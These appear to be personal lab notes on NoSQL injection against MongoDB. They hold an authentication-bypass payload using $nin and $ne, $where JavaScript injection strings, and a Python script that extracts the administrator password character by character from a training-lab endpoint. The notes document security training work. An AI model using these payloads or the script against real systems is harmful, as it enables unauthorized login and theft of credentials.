----------------

### NOSQL Injection

-----------------

- This form of injection is typical to non sql databases e.g mongodb, cypher and others.This will focus more on mongodb.

----------------

- Types-:
  - Syntax injection-: This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
  - Operators injection-:  This occurs when you can use NoSQL query operators to manipulate queries.


----------------  

- Operator injection-: NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result.
- Examples-:

| **Operator** |      **Description**        |
|--------------|---------------------|
|$where | Matches documents that satisfy a JavaScript expression.|
|$ne | Matches all values that are not equal to a specified value|
|$in |Matches all of the values specified in an array. |
|$regex | Selects documents where values match a specified regular expression.|
| $nin  | not in an array |

- SOlving the lab with `$nin`-:

```json
{"username":{"$nin":["carlos","wiener"]},"password":{"$ne":""}}
```

------------------

### Exploiting syntax injection to extract data

-----------------

- In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from the database.
- Brief Example-:
- Vulnerable code-:
```js
{"$where":"this.username == 'admin'"}
```
- Injecting it to dump sensitive data-:

```
admin' && this.password[0] == 'a' || 'a'=='b
```

- Oops,it is blind,let's exfil other info with `match` js function that relies on regex, you'll also notice that the last quotes is removed to match the quote in the statement-:

```
admin' && this.password.match('^a') && '1'=='1
```
- Also, you can use `startswith()` in some instances, works in a nice manner than match because of special characters usage and you just need to comment `'` with `\\'`.

```
admin' && this.password.startswith('a') && '1'=='1
```

- Dumping the password with startswith() payload + python

```python3
#! /usr/bin/env python3
import requests
import asyncio
import string

#Replace host and cookie
#necessary variables
url: str = "https://0a0800e204bc44f580d6087f008e00af.web-security-academy.net"

async def main():
     headers = {"Cookie":"session=57tR4BdA7pjntM4pix5exS2nVIjtMSI3; Secure","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36Sec-Ch-Ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Brave\";v=\"140\""}
     path = "/user/lookup"
     charset = string.ascii_letters + '1234567890' + string.punctuation 
     found_char = ""
     while True:
         for char in charset:
            special_chars = "\\'"
            if char in special_chars: char = '\\' + char
            payload = f"administrator'%26%26this.username=='administrator'%26%26this.password.startsWith('{found_char + char}')%26%26'1'=='1"
            result = requests.get(url + path + "?user="+ payload,headers=headers).text
            if len(result) ==  96:
               found_char += char
               print(f"[+] Found_char::{found_char}")
               break

if __name__ == "__main__":
    asyncio.run(main())
```
